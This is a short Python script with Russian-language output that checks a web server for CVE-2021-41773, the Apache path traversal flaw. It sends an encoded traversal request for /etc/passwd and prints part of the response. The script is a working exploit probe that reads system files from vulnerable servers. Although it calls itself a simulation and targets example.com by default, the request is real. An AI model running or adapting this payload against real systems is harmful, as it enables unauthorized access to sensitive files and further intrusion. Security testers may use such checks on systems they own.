import requests

def check_cve_2021_41773(target_url):
    payload_path = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    test_url = target_url + payload_path

    print("[*] Отправляем тестовый запрос для проверки потенциальной уязвимости...")

    try:
        response = requests.get(test_url, timeout=5)

        if response.status_code == 200:
            print("[+] Потенциальная уязвимость обнаружена (имитация).")
            print("[+] Сервер вернул ответ на подозрительный путь.")
            print(response.text[:200])
        else:
            print("[-] Уязвимость не подтверждена. Код ответа:", response.status_code)

    except Exception as e:
        print("[-] Ошибка при подключении:", e)


if __name__ == "__main__":
    url = "http://example.com"
    check_cve_2021_41773(url)

